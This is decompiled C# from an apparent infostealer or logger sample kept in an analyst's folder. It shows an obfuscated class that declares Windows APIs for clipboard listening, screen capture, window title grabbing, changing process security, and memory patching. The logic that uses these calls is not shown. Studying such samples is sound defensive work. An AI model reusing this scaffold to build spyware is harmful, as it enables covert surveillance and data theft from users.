// Decompiled with JetBrains decompiler
// Type: cWS.jWj
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace cWS
{
  internal static class jWj
  {
    public const int WM_CLIPBOARDUPDATE = 797;
    public static IntPtr HWND_MESSAGE;
    public const int SRCCOPY = 13369376;
    private static jWj Lal;

    [DllImport("user32.dll", EntryPoint = "AddClipboardFormatListener", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool UCM(IntPtr _param0);

    [DllImport("user32.dll", EntryPoint = "SetParent", SetLastError = true)]
    public static extern IntPtr LCf(IntPtr _param0, IntPtr _param1);

    [DllImport("gdi32.dll", EntryPoint = "BitBlt")]
    public static extern bool jC5(
      IntPtr _param0,
      int _param1,
      int _param2,
      int _param3,
      int _param4,
      IntPtr _param5,
      int _param6,
      int _param7,
      int _param8);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
    public static extern IntPtr wCI(IntPtr _param0, int _param1, int _param2);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC")]
    public static extern IntPtr XCl(IntPtr _param0);

    [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
    public static extern bool lCZ(IntPtr _param0);

    [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
    public static extern bool pC4(IntPtr _param0);

    [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
    public static extern IntPtr uCj(IntPtr _param0, IntPtr _param1);

    [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
    public static extern IntPtr MCS();

    [DllImport("user32.dll", EntryPoint = "GetWindowDC")]
    public static extern IntPtr WCt(IntPtr _param0);

    [DllImport("user32.dll", EntryPoint = "ReleaseDC")]
    public static extern IntPtr uCQ(IntPtr _param0, IntPtr _param1);

    [DllImport("user32.dll", EntryPoint = "GetWindowRect")]
    public static extern IntPtr yCK(IntPtr _param0, ref jWj.VWt _param1);

    [DllImport("kernel32.dll", EntryPoint = "DeleteFile", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool WCd(string _param0);

    [DllImport("advapi32.dll", EntryPoint = "GetKernelObjectSecurity", SetLastError = true)]
    public static extern bool WC7(
      IntPtr _param0,
      int _param1,
      [Out] byte[] _param2,
      uint _param3,
      ref uint _param4);

    [DllImport("advapi32.dll", EntryPoint = "SetKernelObjectSecurity", SetLastError = true)]
    public static extern bool JCE(IntPtr _param0, int _param1, [In] byte[] _param2);

    [DllImport("kernel32", EntryPoint = "GetProcAddress")]
    public static extern IntPtr XCq(IntPtr _param0, string _param1);

    [DllImport("kernel32", EntryPoint = "LoadLibrary")]
    public static extern IntPtr NCB(string _param0);

    [DllImport("kernel32", EntryPoint = "VirtualProtect")]
    public static extern bool dCi(IntPtr _param0, UIntPtr _param1, uint _param2, out uint _param3);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr RCu();

    [DllImport("user32.dll", EntryPoint = "GetWindowText", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int aCr(IntPtr _param0, StringBuilder _param1, int _param2);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int SC1(IntPtr _param0);

    static jWj()
    {
      yd.bx(yd.EI);
      jWj.HWND_MESSAGE = new IntPtr(-3);
    }

    internal static bool Waa() => jWj.Lal == null;

    internal static jWj cad() => jWj.Lal;

    internal struct VWt
    {
      public int left;
      public int top;
      public int right;
      public int bottom;
    }

    internal enum mWQ
    {
      PROCESS_TERMINATE = 1,
      PROCESS_CREATE_THREAD = 2,
      PROCESS_VM_OPERATION = 8,
      PROCESS_VM_READ = 16, // 0x00000010
      PROCESS_VM_WRITE = 32, // 0x00000020
      PROCESS_DUP_HANDLE = 64, // 0x00000040
      PROCESS_CREATE_PROCESS = 128, // 0x00000080
      PROCESS_SET_QUOTA = 256, // 0x00000100
      SYNCHRONIZE = 256, // 0x00000100
      PROCESS_SET_INFORMATION = 512, // 0x00000200
      PROCESS_QUERY_INFORMATION = 1024, // 0x00000400
      PROCESS_SUSPEND_RESUME = 2048, // 0x00000800
      PROCESS_QUERY_LIMITED_INFORMATION = 4096, // 0x00001000
      DELETE = 65536, // 0x00010000
      READ_CONTROL = 131072, // 0x00020000
      WRITE_DAC = 262144, // 0x00040000
      ITE_OWNER = 524288, // 0x00080000
      STANDARD_RIGHTS_REQUIRED = 983040, // 0x000F0000
      PROCESS_ALL_ACCESS = 987135, // 0x000F0FFF
    }
  }
}
